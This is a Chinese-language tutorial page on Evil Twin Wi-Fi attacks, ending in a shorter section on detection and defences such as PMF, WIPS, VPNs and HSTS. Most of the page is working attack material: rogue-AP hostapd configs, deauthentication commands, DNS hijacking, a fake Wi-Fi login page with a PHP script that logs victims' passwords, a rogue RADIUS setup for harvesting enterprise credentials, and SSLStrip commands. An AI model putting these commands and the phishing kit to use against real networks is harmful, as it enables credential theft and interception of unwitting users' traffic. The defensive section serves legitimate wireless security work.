# Evil Twin攻击

## 概述

Evil Twin（邪恶双子星）攻击是无线网络中间人攻击的经典形式。攻击者部署与合法AP具有相同SSID（网络名称）的虚假AP，诱使用户自动连接。一旦受害者连接到Evil Twin AP，攻击者可截获所有网络流量、盗取凭据、注入恶意内容。结合Deauth攻击可强制用户断开合法AP并自动重连到Evil Twin。

## 攻击原理

### 建立Rogue AP

```bash
# 使用airgeddon自动完成全套攻击
airgeddon

# 菜单操作：
# 1. 选择网卡接口
# 2. 选择Evil Twin攻击模式
# 3. 选择目标AP
# 4. 选择认证方式（WPA/WPA2）
# 5. 启动Rogue AP + DHCP + DNS

# 手动配置hostapd
cat > /etc/hostapd/hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=Legitimate_WiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=fake_password
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

hostapd /etc/hostapd/hostapd.conf
```

### Deauth攻击

Deauth攻击强制客户端断开与合法AP的连接，迫使其连接Evil Twin：

```bash
# 持续对目标AP所有客户端进行解认证攻击
aireplay-ng -0 0 -a LEGIT_AP_BSSID wlan0mon

# 针对特定客户端
aireplay-ng -0 5 -a LEGIT_AP_BSSID -c CLIENT_MAC wlan0mon

# 使用mdk4进行高效批量解认证
mdk4 wlan0mon d -B LEGIT_AP_BSSID

# 使用bettercap
bettercap -eval "set wifi.interface wlan0mon; wifi.deauth AP_BSSID"
```

## Captive Portal攻击

Evil Twin结合Captive Portal可骗取用户凭据：

### 配置Captive Portal

```bash
# 使用eaphammer
eaphammer --auth captive-portal --essid "Free_WiFi" \
  --captive-portal --landing-page /tmp/landing.html

# 使用airgeddon的Captive Portal模式
# 自动配置DNS劫持、Web服务器
# 支持：Facebook、Google、Microsoft、自定义登录页

# 手动配置DNS劫持
cat > /etc/dnsmasq.conf << EOF
interface=wlan0
dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,24h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
EOF

dnsmasq -C /etc/dnsmasq.conf
```

### Captive Portal网页示例

```html
<!DOCTYPE html>
<html>
<head>
    <title>Wi-Fi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
    <div class="container">
        <h2>Wi-Fi 认证</h2>
        <p>请输入Wi-Fi密码以继续使用网络</p>
        <form action="/login" method="POST">
            <input type="password" name="password" placeholder="Wi-Fi密码" required>
            <button type="submit">连接</button>
        </form>
    </div>
</body>
</html>
```

### 凭据捕获后端

```bash
# 简单的PHP捕获脚本
cat > /var/www/html/login.php << 'EOF'
<?php
$password = $_POST['password'];
$log = date('Y-m-d H:i:s') . " | Password: $password\n";
file_put_contents('/tmp/credentials.txt', $log, FILE_APPEND);
header('Location: http://www.google.com');
exit;
?>
EOF

# 实时监听凭据
tail -f /tmp/credentials.txt
```

## Enterprise网络攻击

企业WPA2-Enterprise使用802.1X/RADIUS认证，可被Rogue RADIUS攻击：

### hostapd-wpe

```bash
# 安装hostapd-wpe
apt-get install hostapd-wpe

# 配置
cat > /etc/hostapd-wpe/hostapd-wpe.conf << EOF
interface=wlan0
driver=nl80211
ssid=Corporate_WiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/eap_users
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
EOF

# 启动
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 捕获的凭据存储在
cat /etc/hostapd-wpe/hostapd-wpe.log
```

### EAP降级攻击

```bash
# 强迫客户端使用较弱的EAP方法
# MSCHAPv2比TLS更容易破解（无客户端证书验证）

# EAP-MD5（最弱）
# EAP-MSCHAPv2（可破解） 
# EAP-TLS（强，需要客户端证书）
# PEAP（内部使用MSCHAPv2，可破解）

# 使用asleap破解LEAP/MSCHAPv2
asleap -r capture.pcap -W wordlist.txt
```

## HTTPS Stripping

Evil Twin结合SSLStrip/SSLStrip+降级HTTPS：

```bash
# 使用bettercap的SSLStrip
bettercap -eval "set arp.spoof.targets 192.168.1.0/24; set http.proxy.sslstrip true; http.proxy on; arp.spoof on"

# 使用mitmproxy
mitmproxy --mode transparent --listen-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080

# 使用dns2proxy进行HSTS绕过
python dns2proxy.py
# 配合SSLStrip+绕过HSTS保护
```

## 检测与防御

### 802.11w管理帧保护

```bash
# 确认AP是否支持管理帧保护（MFP/PMF）
# 检查Beacon帧中的RSN信息
# PMF Capable=1, PMF Required=1

# 启用PMF的AP配置
# hostapd配置
ieee80211w=2  # 2=强制, 1=可选, 0=禁用
```

### 客户端检测方法

```text
# 1. 信号强度差异验证
合法AP信号稳定，Evil Twin信号靠近攻击者
使用Wi-Fi分析仪（如Wifi Analyzer、NetSpot）

# 2. AP MAC地址检查
使用工具查看AP的BSSID是否与已知一致
监视AP的OUI（前三字节）是否合理

# 3. AP指纹识别
合法的企业AP支持802.11r/k/v等
Rogue AP通常不支持高级802.11功能

# 4. WIPS/WIDS检测
部署无线入侵检测系统
检测重复SSID、异常Deauth包、Rogue RADIUS
```

### 防御措施

```text
# 企业网络防御
## 1. 802.1X客户端证书验证
强制使用EAP-TLS，验证服务器和客户端证书

## 2. 网络访问控制（NAC）
基于设备身份和合规状态的接入控制

## 3. 无线IDS/IPS
部署WIPS系统（如Cisco MSE、Aruba WIPS）
实时检测Rogue AP、Deauth攻击、异常关联

## 4. 物理安全
定期进行无线站点调查
识别和移除未经授权的AP

# 公共Wi-Fi防御
## 1. VPN强制
所有流量通过VPN隧道
防止Captive Portal和SSLStrip

## 2. HSTS预加载
浏览器预加载HSTS列表
防止第一次连接时降级

## 3. DNSSEC
DNS查询结果签名验证
防止DNS劫持

## 4. 证书固定
应用层验证服务器证书
检测伪造证书
```

### 检测工具

| 工具 | 用途 | 平台 |
|------|------|------|
| Kismet | 无线IDS | Linux/macOS |
| Wireshark | 流量分析 | 跨平台 |
| bettercap | 网络监控 | Linux |
| Wifite | 自动化审计 | Linux |
| eaphammer | Evil Twin框架 | Linux |
| Airgeddon | 全功能攻击 | Linux |

## 参考资源

- [Airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)
- [hostapd-wpe](https://github.com/OpenSecurityResearch/hostapd-wpe)
- [eaphammer](https://github.com/s0lst1c3/eaphammer)
- [bettercap](https://www.bettercap.org/)
- [Evil Twin Attack Framework](https://github.com/DanMcInerney/evil-twin-framework)
